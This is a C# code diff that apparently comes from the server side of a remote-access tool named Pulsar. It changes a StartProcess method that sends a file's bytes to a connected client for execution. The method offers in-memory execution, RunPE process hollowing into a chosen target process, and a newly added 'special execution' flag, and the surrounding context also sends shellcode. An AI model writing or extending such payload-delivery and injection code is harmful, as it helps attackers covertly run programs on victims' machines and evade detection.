@@ -79,20 +79,30 @@ namespace Pulsar.Server.Messages
                 Shellcode = shellcode
             });
         }
-        public void StartProcess(string remotePath, bool isUpdate = false, bool executeInMemory = false, bool useRunPE = false, string runPETarget = "a", string runPECustomPath = null)
+        public void StartProcess(string remotePath,
+                                 bool isUpdate = false,
+                                 bool executeInMemory = false,
+                                 bool useRunPE = false,
+                                 string runPETarget = "a",
+                                 string runPECustomPath = null,
+                                 bool useSpecialExecution = false)   // <<< NEW ARG
         {
             if (!File.Exists(remotePath))
             {
-                MessageBox.Show($"File not found: {remotePath}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show($"File not found: {remotePath}", "Error",
+                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
 
             byte[] fileBytes = File.ReadAllBytes(remotePath);
             string ext = Path.GetExtension(remotePath);
 
-            if ((executeInMemory || useRunPE) && !string.Equals(ext, ".exe", StringComparison.OrdinalIgnoreCase))
+            // Validate special execution restrictions
+            if ((executeInMemory || useRunPE) &&
+                !string.Equals(ext, ".exe", StringComparison.OrdinalIgnoreCase))
             {
-                MessageBox.Show("Only .exe files are allowed for RunPE or reflection execution.", "Invalid File Type",
+                MessageBox.Show("Only .exe files are allowed for RunPE or reflection execution.",
+                    "Invalid File Type",
                     MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
@@ -100,12 +110,22 @@ namespace Pulsar.Server.Messages
             _client.Send(new DoProcessStart
             {
                 FileBytes = fileBytes,
+                FilePath = remotePath,
+                FileExtension = ext,
+
+                // Existing flags
                 IsUpdate = isUpdate,
                 ExecuteInMemoryDotNet = executeInMemory,
                 UseRunPE = useRunPE,
                 RunPETarget = runPETarget,
                 RunPECustomPath = runPECustomPath,
-                FileExtension = ext
+
+                // NEW field sent to the client
+                UseSpecialExecution = useSpecialExecution,
+
+                // FileManager execution type
+                IsFromFileManager = false,
+                DownloadUrl = null
             });
         }
 
